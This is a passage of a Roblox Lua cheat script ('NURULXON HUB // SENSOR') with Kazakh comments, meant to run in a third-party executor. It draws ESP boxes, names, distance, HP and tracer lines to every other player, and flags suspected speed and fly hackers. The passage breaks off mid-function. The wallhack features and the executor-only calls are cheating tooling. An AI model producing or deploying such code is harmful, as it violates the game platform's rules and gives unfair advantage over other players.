        local ring = Instance.new("Frame")
        ring.Size = UDim2.new(1, 0, 1, 0)
        ring.BackgroundTransparency = 1
        ring.Parent = d.headGui
        Instance.new("UICorner", ring).CornerRadius = UDim.new(1, 0)
        d.ringStroke = Instance.new("UIStroke")
        d.ringStroke.Color = Cfg.colors.normal
        d.ringStroke.Thickness = 1.6
        d.ringStroke.Transparency = 1
        d.ringStroke.Parent = ring
        d.dot = Instance.new("Frame")
        d.dot.AnchorPoint = Vector2.new(0.5, 0.5)
        d.dot.Position = UDim2.new(0.5, 0, 0.5, 0)
        d.dot.Size = UDim2.new(0, 4, 0, 4)
        d.dot.BackgroundColor3 = Cfg.colors.normal
        d.dot.BorderSizePixel = 0
        d.dot.Parent = ring
        Instance.new("UICorner", d.dot).CornerRadius = UDim.new(1, 0)

        -- ат + ақпарат + күдік белгісі (бастың үстінде)
        d.tag = newBillboard(UDim2.new(0, 190, 0, 60), Vector3.new(0, 2.8, 0))
        d.name = newLabel(d.tag, UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 0, 18), 14, Cfg.colors.normal)
        d.name.Text = plr.Name
        d.info = newLabel(d.tag, UDim2.new(0, 0, 0, 18), UDim2.new(1, 0, 0, 14), 11, GRAY)
        d.flag = newLabel(d.tag, UDim2.new(0, 10, 0, 36), UDim2.new(1, -20, 0, 16), 11, BLACK)
        d.flag.BackgroundTransparency = 0
        d.flag.BackgroundColor3 = Cfg.colors.suspect
        d.flag.TextStrokeTransparency = 1
        d.flag.Visible = false

        -- ойыншылар бірінен кейін бірі "сканерден өтіп" шығады
        task.delay(delayT or 0, function()
            if d.boxStroke and d.boxStroke.Parent then
                TweenService:Create(d.boxStroke, TweenInfo.new(0.45), {Transparency = 0}):Play()
                TweenService:Create(d.ringStroke, TweenInfo.new(0.45), {Transparency = 0}):Play()
            end
        end)
    end

    local function removePlayer(plr)
        local d = tracked[plr]
        if not d then return end
        for _, k in ipairs({"box", "headGui", "tag", "line"}) do
            if d[k] then d[k]:Destroy() end
        end
        tracked[plr] = nil
    end

    local function activeFlags(d, now)
        local list = {}
        for n, tm in pairs(d.flags) do
            if now - tm < 6 then table.insert(list, n) else d.flags[n] = nil end
        end
        table.sort(list)
        return list
    end

    local function step(plr, d, now)
        local char = plr.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local head = char and char:FindFirstChild("Head")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not (hrp and head and hum and hum.Health > 0) then
            d.alive = false
            d.hrp = nil
            d.box.Enabled = false
            d.headGui.Enabled = false
            d.tag.Enabled = false
            d.lastChar = nil
            return
        end
        d.alive = true
        d.hrp = hrp
        d.box.Adornee = hrp
        d.headGui.Adornee = head
        d.tag.Adornee = head

        local pos = hrp.Position
        if d.lastChar ~= char then
            d.lastChar = char
            d.lastPos = pos
            d.lastT = now
            d.airT = 0
            d.speedT = 0
            d.spawnGrace = now + 2.5
        end

        if not Cfg.detect and next(d.flags) then d.flags = {} end

        local dt = now - d.lastT
        if dt >= 0.1 then
            local delta = pos - d.lastPos
            local hs = Vector3.new(delta.X, 0, delta.Z).Magnitude / dt
            local vy = delta.Y / dt
            d.lastPos = pos
            d.lastT = now
            if Cfg.detect and now > d.spawnGrace then
                local seated = hum.SeatPart ~= nil
                -- ЕСКЕРТУ: телепортты бақыламаймыз — бұл ойында теле­порт қалыпты механизм, читерлік емес.
                -- жылдамдық
                if (not seated) and hs > 42 and delta.Magnitude <= 70 then
                    d.speedT = d.speedT + dt
                else
                    d.speedT = math.max(0, d.speedT - dt)
                end
                if d.speedT > 0.8 then d.flags["SPEED"] = now end
                -- ұшу: астында жер жоқ, тік жылдамдық ~0
                rayParams.FilterDescendantsInstances = {char, Folder}
                local hit = workspace:Raycast(pos, Vector3.new(0, -9, 0), rayParams)
                local swimming = false
                pcall(function() swimming = (hum:GetState() == Enum.HumanoidStateType.Swimming) end)
                if (not seated) and (not hit) and (not swimming) and math.abs(vy) < 2.5 then
                    d.airT = d.airT + dt
                else
                    d.airT = math.max(0, d.airT - dt * 2)
                end
                if d.airT > 1.5 then d.flags["FLY"] = now end
            end
        end

        local cam = workspace.CurrentCamera
        local dist = cam and (cam.CFrame.Position - pos).Magnitude or 0
        d.info.Text = "[" .. math.floor(dist) .. "m]  HP " .. math.floor(hum.Health)

        local list = activeFlags(d, now)
        d.suspect = Cfg.detect and #list > 0
        d.flagText = table.concat(list, "+")

        -- көрінуі (баптауларға байланысты)
        local on = Cfg.esp
        d.box.Enabled = on and Cfg.box
        d.headGui.Enabled = on and Cfg.head
        d.name.Visible = Cfg.names
        d.info.Visible = Cfg.info
        d.tag.Enabled = on and (Cfg.names or Cfg.info or d.suspect)

        local col = d.suspect and Cfg.colors.suspect or Cfg.colors.normal
        d.name.Text = d.suspect and (plr.Name .. " [ХАКЕР]") or plr.Name
        d.name.TextColor3 = d.suspect and Cfg.colors.suspect or Cfg.colors.normal
        d.dot.BackgroundColor3 = col
        d.boxStroke.Color = col
        d.ringStroke.Color = col
        d.flag.BackgroundColor3 = Cfg.colors.suspect
        if d.suspect then
            d.flag.Visible = true
            d.flag.Text = "⚠ ХАКЕР: " .. table.concat(list, " + ")
            d.boxStroke.Thickness = 2.6
            d.ringStroke.Thickness = 3
        else
            d.flag.Visible = false
            d.boxStroke.Thickness = 1.4
            d.ringStroke.Thickness = 1.6
        end
    end

    -- ===== UI көмекші функциялар =====
    local function makeDraggable(handle, target)
        local dragging, startInput, startPos = false, nil, nil
        handle.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                startInput = input.Position
                startPos = target.Position
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local dlt = input.Position - startInput
                target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + dlt.X, startPos.Y.Scale, startPos.Y.Offset + dlt.Y)
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)
    end

    local function styleOnOff(btn, on, textOn, textOff)
        btn.Text = on and textOn or textOff
        btn.BackgroundColor3 = on and Cfg.colors.accent or GRAY
        btn.TextColor3 = contrast(btn.BackgroundColor3)
    end

    -- ===== HUD панелі =====
    local Panel = Instance.new("Frame")
    Panel.Size = UDim2.new(0, 240, 0, 246)
    Panel.Position = UDim2.new(0, 10, 0, 70)
    Panel.BackgroundColor3 = BLACK
    Panel.BackgroundTransparency = 0.12
    Panel.BorderSizePixel = 0
    Panel.Active = true
    Panel.Draggable = true
    Panel.ZIndex = 10
    Panel.Parent = Hud
    Instance.new("UICorner", Panel).CornerRadius = UDim.new(0, 6)
    local pStroke = Instance.new("UIStroke")
    pStroke.Thickness = 1.4
    pStroke.Parent = Panel
    accentize(pStroke, "Color")

    local function hudLabel(y, h, size, color)
        local l = Instance.new("TextLabel")
        l.BackgroundTransparency = 1
        l.Position = UDim2.new(0, 8, 0, y)
        l.Size = UDim2.new(1, -16, 0, h)
        l.Font = Enum.Font.Code
        l.TextSize = size
        l.TextColor3 = color
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.TextYAlignment = Enum.TextYAlignment.Top
        l.Text = ""
        l.Parent = Panel
        return l
    end

    local TitleL = hudLabel(6, 16, 12, WHITE)
    TitleL.Text = "NURULXON HUB // SENSOR"
    accentize(TitleL, "TextColor3")
    local SelfL = hudLabel(23, 14, 10, GRAY)
    local exName = "?"
    pcall(function() exName = tostring((identifyexecutor())) end)
    local platform = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled) and "MOBILE" or "PC"
    SelfL.Text = "YOU: " .. exName .. " | " .. platform

    local function smallBtn(text, i)
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0, 70, 0, 20)
        b.Position = UDim2.new(0, 8 + (i - 1) * 76, 0, 42)
        b.Font = Enum.Font.Code
        b.TextSize = 10
        b.AutoButtonColor = false
        b.Text = text
        b.Parent = Panel
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
        return b
    end
    local ToggleBtn = smallBtn("ESP: ON", 1)
    local TracerBtn = smallBtn("LINES: ON", 2)
    local SetBtn = smallBtn("SETTINGS", 3)
    SetBtn.BackgroundColor3 = GRAY
    SetBtn.TextColor3 = BLACK

    local CountL = hudLabel(70, 14, 11, WHITE)
    local NearestL = hudLabel(86, 14, 11, Cfg.colors.nearest)
    local ListL = hudLabel(102, 140, 10, WHITE)

    table.insert(refreshers, function()
        styleOnOff(ToggleBtn, Cfg.esp, "ESP: ON", "ESP: OFF")
        styleOnOff(TracerBtn, Cfg.tracers, "LINES: ON", "LINES: OFF")
        NearestL.TextColor3 = Cfg.colors.nearest
    end)
    ToggleBtn.MouseButton1Click:Connect(function() Cfg.esp = not Cfg.esp; refreshAll(); saveCfg() end)
    TracerBtn.MouseButton1Click:Connect(function() Cfg.tracers = not Cfg.tracers; refreshAll(); saveCfg() end)

    -- ===== SETTINGS терезесі =====
    local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(800, 400)
    local winH = math.min(340, vp.Y - 16)
    local Settings = Instance.new("Frame")
    Settings.Size = UDim2.new(0, 270, 0, winH)
    Settings.Position = UDim2.new(0, math.clamp(260, 0, math.max(0, vp.X - 270)), 0, 8)
    Settings.BackgroundColor3 = BLACK
    Settings.BackgroundTransparency = 0.08
    Settings.BorderSizePixel = 0
    Settings.Visible = false
    Settings.ZIndex = 30
    Settings.Active = true
    Settings.Draggable = true -- Roblox-тың өз тартуы, тақырып жолағымен қатар қосымша сенімділік үшін
    Settings.Parent = Hud
    Instance.new("UICorner", Settings).CornerRadius = UDim.new(0, 6)
    local sStroke = Instance.new("UIStroke")
    sStroke.Thickness = 1.4
    sStroke.Parent = Settings
    accentize(sStroke, "Color")

    local SHeader = Instance.new("Frame")
    SHeader.Size = UDim2.new(1, 0, 0, 28)
    SHeader.BackgroundColor3 = DARK
    SHeader.BorderSizePixel = 0
    SHeader.Parent = Settings
    Instance.new("UICorner", SHeader).CornerRadius = UDim.new(0, 6)
    local STitle = Instance.new("TextLabel")
    STitle.BackgroundTransparency = 1
    STitle.Position = UDim2.new(0, 10, 0, 0)
    STitle.Size = UDim2.new(1, -44, 1, 0)
    STitle.Font = Enum.Font.Code
    STitle.TextSize = 12
    STitle.TextXAlignment = Enum.TextXAlignment.Left
    STitle.Text = "SETTINGS // БАПТАУ"
    STitle.Parent = SHeader
    accentize(STitle, "TextColor3")
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 22, 0, 20)
    CloseBtn.Position = UDim2.new(1, -28, 0, 4)
    CloseBtn.BackgroundColor3 = GRAY
    CloseBtn.TextColor3 = BLACK
    CloseBtn.Font = Enum.Font.Code
    CloseBtn.TextSize = 12
    CloseBtn.Text = "X"
    CloseBtn.AutoButtonColor = false
    CloseBtn.Parent = SHeader
    Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 4)
    CloseBtn.MouseButton1Click:Connect(function() Settings.Visible = false end)
    SetBtn.MouseButton1Click:Connect(function() Settings.Visible = not Settings.Visible end)
    makeDraggable(SHeader, Settings)

    local Scroll = Instance.new("ScrollingFrame")
    Scroll.Position = UDim2.new(0, 6, 0, 34)
    Scroll.Size = UDim2.new(1, -12, 1, -40)
    Scroll.BackgroundTransparency = 1
    Scroll.BorderSizePixel = 0
    Scroll.ScrollBarThickness = 4
    Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    Scroll.Parent = Settings
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 4)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = Scroll
    local orderN = 0
    local function nextOrder() orderN = orderN + 1; return orderN end

    local function addSection(text)
        local l = Instance.new("TextLabel")
        l.Size = UDim2.new(1, 0, 0, 18)
        l.BackgroundTransparency = 1
        l.Font = Enum.Font.Code
        l.TextSize = 11
        l.TextColor3 = GRAY
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Text = "── " .. text .. " ──"
        l.LayoutOrder = nextOrder()
        l.Parent = Scroll
    end

    local function addToggle(label, key)
        local row = Instance.new("TextButton")
        row.Size = UDim2.new(1, 0, 0, 24)
        row.BackgroundColor3 = DARK
        row.Text = ""
        row.AutoButtonColor = false
        row.LayoutOrder = nextOrder()
        row.Parent = Scroll
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
        local l = Instance.new("TextLabel")
        l.BackgroundTransparency = 1
        l.Position = UDim2.new(0, 8, 0, 0)
        l.Size = UDim2.new(1, -60, 1, 0)
        l.Font = Enum.Font.Code
        l.TextSize = 11
        l.TextColor3 = WHITE
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Text = label
        l.Parent = row
        local st = Instance.new("TextLabel")
        st.Position = UDim2.new(1, -46, 0.5, -9)
        st.Size = UDim2.new(0, 40, 0, 18)
        st.Font = Enum.Font.Code
        st.TextSize = 10
        st.Parent = row
        Instance.new("UICorner", st).CornerRadius = UDim.new(0, 4)
        table.insert(refreshers, function()
            st.Text = Cfg[key] and "ON" or "OFF"
            st.BackgroundColor3 = Cfg[key] and Cfg.colors.accent or GRAY
            st.TextColor3 = contrast(st.BackgroundColor3)
        end)
        row.MouseButton1Click:Connect(function() Cfg[key] = not Cfg[key]; refreshAll(); saveCfg() end)
    end

    local function addSlider(label, min, max, init, step, fmt, onChange)
        local row = Instance.new("Frame")
        row.Size = UDim2.new(1, 0, 0, 38)
        row.BackgroundColor3 = DARK
        row.BorderSizePixel = 0
        row.LayoutOrder = nextOrder()
        row.Parent = Scroll
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)
        local txt = Instance.new("TextLabel")
        txt.BackgroundTransparency = 1
        txt.Position = UDim2.new(0, 8, 0, 2)
        txt.Size = UDim2.new(1, -16, 0, 14)
        txt.Font = Enum.Font.Code
        txt.TextSize = 11
        txt.TextColor3 = WHITE
        txt.TextXAlignment = Enum.TextXAlignment.Left
        txt.Parent = row
        local hit = Instance.new("TextButton")
        hit.BackgroundTransparency = 1
        hit.Text = ""
        hit.AutoButtonColor = false
        hit.Position = UDim2.new(0, 0, 0, 16)
        hit.Size = UDim2.new(1, 0, 0, 22)
        hit.Parent = row
        local bar = Instance.new("Frame")
        bar.Position = UDim2.new(0, 10, 0.5, -2)
        bar.Size = UDim2.new(1, -20, 0, 4)
        bar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        bar.BorderSizePixel = 0
        bar.Parent = hit
        Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
        local fill = Instance.new("Frame")
        fill.Size = UDim2.new(0, 0, 1, 0)
        fill.BorderSizePixel = 0
        fill.Parent = bar
        accentize(fill, "BackgroundColor3")
        local knob = Instance.new("Frame")
        knob.AnchorPoint = Vector2.new(0.5, 0.5)
        knob.Size = UDim2.new(0, 12, 0, 12)
        knob.BorderSizePixel = 0
        knob.Parent = bar
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)
        accentize(knob, "BackgroundColor3")

        local value = init
        local function show(v)
            value = v
            local a = (v - min) / (max - min)
            fill.Size = UDim2.new(a, 0, 1, 0)
            knob.Position = UDim2.new(a, 0, 0.5, 0)
            txt.Text = label .. ": " .. string.format(fmt, v)
        end
        show(init)

        local dragging = false
        local function fromX(x)
            local rel = math.clamp((x - bar.AbsolutePosition.X) / math.max(bar.AbsoluteSize.X, 1), 0, 1)
            local v = min + (max - min) * rel
            v = math.clamp(math.floor(v / step + 0.5) * step, min, max)
            if v ~= value then
                show(v)
                onChange(v)
            end
        end
        hit.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                Scroll.ScrollingEnabled = false
                fromX(input.Position.X)
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                fromX(input.Position.X)
            end
        end)
        UserInputService.InputEnded:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
                dragging = false
                Scroll.ScrollingEnabled = true
            end
        end)
        return { Set = show }
    end

    -- ---- Display ----
    addSection("DISPLAY // КӨРІНІС")
    addToggle("ESP (барлығы)", "esp")
    addToggle("Төртбұрыш (Box)", "box")
    addToggle("Бас белгісі", "head")
    addToggle("Аты (Name)", "names")
    addToggle("Қашықтық + HP", "info")
    addToggle("Күдікті анықтау", "detect")

    -- ---- Tracers ----
    addSection("LINES // СЫЗЫҚТАР")
    addToggle("Сызықтар (Tracers)", "tracers")
    addToggle("Ең жақынды белгілеу", "nearestHL")

    local originBtn = Instance.new("TextButton")
    originBtn.Size = UDim2.new(1, 0, 0, 24)
    originBtn.BackgroundColor3 = DARK
    originBtn.Font = Enum.Font.Code
    originBtn.TextSize = 11
    originBtn.TextColor3 = WHITE
    originBtn.AutoButtonColor = false
    originBtn.LayoutOrder = nextOrder()
    originBtn.Parent = Scroll
    Instance.new("UICorner", originBtn).CornerRadius = UDim.new(0, 4)
    local origins = { "Bottom", "Center", "Top" }
    table.insert(refreshers, function() originBtn.Text = "Сызық басы: " .. Cfg.origin:upper() end)
    originBtn.MouseButton1Click:Connect(function()
        local i = table.find(origins, Cfg.origin) or 1
        Cfg.origin = origins[i % #origins + 1]
        refreshAll()
        saveCfg()
    end)

    addSlider("Қалыңдық", 1, 6, Cfg.thickness, 1, "%.0f", function(v) Cfg.thickness = v; saveCfg() end)
    addSlider("Мөлдірлік", 0, 0.9, Cfg.transparency, 0.05, "%.2f", function(v) Cfg.transparency = v; saveCfg() end)

    -- ---- Colors ----
    addSection("COLORS // ТҮСТЕР")
    local targets = {
        { key = "normal", label = "NORMAL" },
        { key = "suspect", label = "SUSPECT" },
        { key = "nearest", label = "NEAREST" },
        { key = "accent", label = "UI" },
    }
    local sel = 1
    local rv = { 255, 255, 255 }
    local rgb = {}

    local selRow = Instance.new("Frame")
    selRow.Size = UDim2.new(1, 0, 0, 26)
    selRow.BackgroundTransparency = 1
    selRow.LayoutOrder = nextOrder()
    selRow.Parent = Scroll
    local selBtns = {}

    local function loadSel()
        local c = Cfg.colors[targets[sel].key]
        rv = { math.floor(c.R * 255 + 0.5), math.floor(c.G * 255 + 0.5), math.floor(c.B * 255 + 0.5) }
        for i = 1, 3 do rgb[i].Set(rv[i]) end
    end

    for i, t in ipairs(targets) do
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0.25, -3, 1, 0)
        b.Position = UDim2.new((i - 1) * 0.25, 0, 0, 0)
        b.Font = Enum.Font.Code
        b.TextSize = 10
        b.Text = t.label
        b.AutoButtonColor = false
        b.Parent = selRow
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
        local bs = Instance.new("UIStroke")
        bs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        bs.Thickness = 0
        bs.Parent = b
        selBtns[i] = { b, bs }
        b.MouseButton1Click:Connect(function() sel = i; loadSel(); refreshAll() end)
    end
    table.insert(refreshers, function()
        for i, t in ipairs(targets) do
            local b, bs = selBtns[i][1], selBtns[i][2]
            local c = Cfg.colors[t.key]
            b.BackgroundColor3 = c
            b.TextColor3 = contrast(c)
            bs.Color = contrast(c)
            bs.Thickness = (i == sel) and 2.5 or 0
        end
    end)

    local function onRGB()
        Cfg.colors[targets[sel].key] = Color3.fromRGB(rv[1], rv[2], rv[3])
        refreshAll()
        saveCfg()
    end
    rgb[1] = addSlider("R (қызыл)", 0, 255, 255, 1, "%.0f", function(v) rv[1] = v; onRGB() end)
    rgb[2] = addSlider("G (жасыл)", 0, 255, 255, 1, "%.0f", function(v) rv[2] = v; onRGB() end)
    rgb[3] = addSlider("B (көк)", 0, 255, 255, 1, "%.0f", function(v) rv[3] = v; onRGB() end)

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, 0, 0, 24)
    resetBtn.BackgroundColor3 = GRAY
    resetBtn.TextColor3 = BLACK
    resetBtn.Font = Enum.Font.Code
    resetBtn.TextSize = 11
    resetBtn.Text = "RESET COLORS // ҚАЛПЫНА"
    resetBtn.AutoButtonColor = false
    resetBtn.LayoutOrder = nextOrder()
    resetBtn.Parent = Scroll
    Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 4)
    resetBtn.MouseButton1Click:Connect(function()
        for k, c in pairs(DEFAULT_COLORS) do Cfg.colors[k] = c end
        loadSel()
        refreshAll()
        saveCfg()
    end)

    loadSel()
    refreshAll()

    -- ===== әр ойыншыға сызық: фреймдер арқылы (Drawing API керек емес) =====
    local function updateTracers()
        local cam = workspace.CurrentCamera
        if not cam then return end
        local vs = Hud.AbsoluteSize
        if vs.X < 10 then vs = cam.ViewportSize end
        local center = vs / 2
        local origin
        if Cfg.origin == "Top" then
            origin = Vector2.new(center.X, 6)
        elseif Cfg.origin == "Center" then
            origin = center
        else
            origin = Vector2.new(center.X, vs.Y - 6)
        end

        -- ең жақын ойыншы
        local nearestPlr, nearestDist = nil, math.huge
        local camPos = cam.CFrame.Position
        local total = 0
        for plr, d in pairs(tracked) do
            if d.alive and d.hrp and d.hrp.Parent then
                total = total + 1
                local dist = (d.hrp.Position - camPos).Magnitude
                if dist < nearestDist then nearestDist, nearestPlr = dist, plr end
            end
        end
        if nearestPlr then
            NearestL.Text = "NEAREST: " .. nearestPlr.Name .. " (" .. math.floor(nearestDist) .. "m)"
        else
            NearestL.Text = "NEAREST: --"
        end

        for plr, d in pairs(tracked) do
            local line = d.line
            if not (Cfg.esp and Cfg.tracers and d.alive and d.hrp and d.hrp.Parent) then
                line.Visible = false
            else
                local sp = cam:WorldToViewportPoint(d.hrp.Position)
                local target = Vector2.new(sp.X, sp.Y)
                local behind = sp.Z <= 0
                if behind then
                    -- камера артындағы ойыншы: сызық төменгі шетпен қай жаққа екенін көрсетеді
                    local side = ((2 * center.X - sp.X) >= center.X) and 1 or -1
                    target = Vector2.new(center.X + side * vs.X * 0.5, vs.Y + 150)
                end
                local dir = target - origin
                local len = dir.Magnitude
                if len > 5000 then
                    dir = dir.Unit * 5000
                    len = 5000
                end
                if len < 2 then
                    line.Visible = false
                else
                    local mid = origin + dir / 2
                    local isNear = Cfg.nearestHL and plr == nearestPlr
                    local col = d.suspect and Cfg.colors.suspect or (isNear and Cfg.colors.nearest or Cfg.colors.normal)
                    line.BackgroundColor3 = col
                    line.BackgroundTransparency = math.clamp(Cfg.transparency + (behind and 0.35 or 0), 0, 0.95)
                    line.Size = UDim2.fromOffset(Cfg.thickness + (isNear and 1 or 0), len)
                    line.Position = UDim2.fromOffset(mid.X, mid.Y)
                    line.Rotation = math.deg(math.atan2(dir.X, -dir.Y))
                    line.Visible = true
                end
            end
        end
    end

    -- ===== іске қосылғандағы баннер =====
    local others = 0
    for _, pl in ipairs(Players:GetPlayers()) do
        if pl ~= LocalPlayer then others = others + 1 end
    end
    local Banner = Instance.new("Frame")
    Banner.AnchorPoint = Vector2.new(0.5, 0)
    Banner.Size = UDim2.new(0, 320, 0, 34)
    Banner.Position = UDim2.new(0.5, 0, 0, -50)
    Banner.BackgroundColor3 = Cfg.colors.accent
    Banner.BorderSizePixel = 0
    Banner.ZIndex = 40
    Banner.Parent = Hud
    Instance.new("UICorner", Banner).CornerRadius = UDim.new(0, 6)
    local bannerTxt = Instance.new("TextLabel")
    bannerTxt.Size = UDim2.new(1, 0, 1, 0)
    bannerTxt.BackgroundTransparency = 1
    bannerTxt.Font = Enum.Font.Code
    bannerTxt.TextSize = 13
    bannerTxt.TextColor3 = contrast(Cfg.colors.accent)
    bannerTxt.Text = "◉ PLAYER SENSOR ONLINE // " .. others .. " TARGETS"
    bannerTxt.Parent = Banner
    task.spawn(function()
        local bg, fg = Cfg.colors.accent, contrast(Cfg.colors.accent)
        TweenService:Create(Banner, TweenInfo.new(0.45, Enum.EasingStyle.Back), {Position = UDim2.new(0.5, 0, 0, 12)}):Play()
        task.wait(0.6)
        for _ = 1, 3 do
            Banner.BackgroundColor3 = fg
            bannerTxt.TextColor3 = bg
            task.wait(0.07)
            Banner.BackgroundColor3 = bg
            bannerTxt.TextColor3 = fg
            task.wait(0.07)
        end
        task.wait(2.2)
        TweenService:Create(Banner, TweenInfo.new(0.4), {Position = UDim2.new(0.5, 0, 0, -50)}):Play()
        task.wait(0.5)
        Banner:Destroy()
    end)

    -- ===== қосу / негізгі цикл =====
    local idx = 0
    for _, pl in ipairs(Players:GetPlayers()) do
        idx = idx + 1
        addPlayer(pl, 0.5 + idx * 0.15)
    end
    Players.PlayerAdded:Connect(function(pl) addPlayer(pl, 0.2) end)
    Players.PlayerRemoving:Connect(removePlayer)

    RunService.RenderStepped:Connect(function()
        if not Hud.Parent then return end
        local ok, err = pcall(updateTracers)
        if not ok then warn("[Sensor/Lines] " .. tostring(err)) end
    end)

    local acc = 0
    local hudAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        if not Hud.Parent then return end
        acc = acc + dt
        hudAcc = hudAcc + dt
        if acc >= 0.05 then
            acc = 0
            local now = os.clock()
            for plr, d in pairs(tracked) do
                local ok, err = pcall(step, plr, d, now)
                if not ok then warn("[Sensor] " .. tostring(err)) end
            end
        end
        if hudAcc >= 0.5 then
            hudAcc = 0
            local total, sus, lines = 0, 0, {}
            for plr, d in pairs(tracked) do
                total = total + 1
                if d.suspect then
                    sus = sus + 1
                    -- Барлық хакерді көрсетеміз, саны шектелмейді
                    table.insert(lines, "⚠ ХАКЕР: " .. plr.Name .. " - " .. tostring(d.flagText))
                end
            end
            table.sort(lines)
            CountL.Text = "PLAYERS " .. total .. " | SUSPECTS " .. sus
            if not Cfg.detect then
                ListL.Text = "detection off"
            else
                ListL.Text = (#lines > 0) and table.concat(lines, "\n") or "no suspicious activity"
            end
        end
    end)
end

local function buildGate()
local MATRIX = Color3.fromRGB(20, 100, 235)  -- matrix фоны: қою көк
local MAIN  = Color3.fromRGB(20, 100, 235)    -- негізгі: қою көк (cyan орнына)
local ACCENT = Color3.fromRGB(255, 0, 110)    -- қосымша: қызғылт (pink)
local GREEN = Color3.fromRGB(0, 255, 136)     -- сәтті/экран түсі: жасыл
local ALERT = Color3.fromRGB(255, 0, 110)     -- ескерту: қызғылт

local oldPass = CoreGui:FindFirstChild("NurlykhanCyberGate")
if oldPass then oldPass:Destroy() end

local GateGui = Instance.new("ScreenGui")
GateGui.Name = "NurlykhanCyberGate"
GateGui.ResetOnSpawn = false
GateGui.DisplayOrder = 999
attachGui(GateGui)

local function alive()
    return GateGui and GateGui.Parent
end

-- ===================== MAIN FRAME =====================
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 560, 0, 320)
MainFrame.Position = UDim2.new(0, 16, 0.5, -160)  -- экранның СОЛ жақ бетінде
MainFrame.BackgroundColor3 = Color3.fromRGB(6, 10, 18)
MainFrame.BackgroundTransparency = 0.2
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true -- Roblox-тың өз тартуы, GateHeaderBar-мен қатар қосымша сенімділік үшін
MainFrame.ClipsDescendants = true
MainFrame.Parent = GateGui
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

-- Саусақпен жеңіл көтеру үшін терезенің жоғарғы жолағы толығымен тартылатын болады
local GateHeaderBar = Instance.new("Frame")
GateHeaderBar.Size = UDim2.new(1, 0, 0, 36)
GateHeaderBar.Position = UDim2.new(0, 0, 0, 0)
GateHeaderBar.BackgroundTransparency = 1
GateHeaderBar.ZIndex = 3
GateHeaderBar.Parent = MainFrame
makeDraggable(GateHeaderBar, MainFrame)

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = MAIN
mainStroke.Thickness = 2
mainStroke.Parent = MainFrame

local TopNeon = Instance.new("Frame")
TopNeon.Size = UDim2.new(1, 0, 0, 3)
TopNeon.BackgroundColor3 = ACCENT
TopNeon.BorderSizePixel = 0
TopNeon.ZIndex = 8
TopNeon.Parent = MainFrame

-- ===== РАДУЖНЫЙ ШЕТ: тек терезенің сыртқы контуры мен жоғарғы сызығы ауысады;
-- аватар тұрған (скан) аймақ қара-ақ күйінде қалады, оған тиіспейміз. =====
task.spawn(function()
    local hue = 0
    while MainFrame and MainFrame.Parent do
        hue = (hue + 0.006) % 1
        local col = Color3.fromHSV(hue, 0.85, 1)
        mainStroke.Color = col
        TopNeon.BackgroundColor3 = col
        task.wait(0.03)
    end
end)

-- ===== ЛОГОТИП (X Gemini) =====
-- Нұсқа 1: Roblox-қа жүктеген сурет ID-сі. Нұсқа 2: тікелей сурет сілтемесі (png/jpg).
local LOGO_ASSET_ID = nil   -- мысалы: 1234567890
local LOGO_URL = ""         -- мысалы: "https://i.imgur.com/xxxxx.png"
local Logo = Instance.new("ImageLabel")
Logo.Size = UDim2.new(0, 32, 0, 32)
Logo.Position = UDim2.new(1, -42, 0, 8)
Logo.BackgroundTransparency = 1
Logo.ScaleType = Enum.ScaleType.Fit
Logo.ZIndex = 9
Logo.Visible = false
Logo.Parent = MainFrame
if LOGO_ASSET_ID then
    Logo.Image = "rbxassetid://" .. tostring(LOGO_ASSET_ID)
    Logo.Visible = true
elseif LOGO_URL ~= "" then
    task.spawn(function()
        pcall(function()
            local res = request({ Url = LOGO_URL, Method = "GET" })
            if res and res.StatusCode == 200 and res.Body then
                writefile("nx_logo.png", res.Body)
                Logo.Image = getcustomasset("nx_logo.png")
                Logo.Visible = true
            end
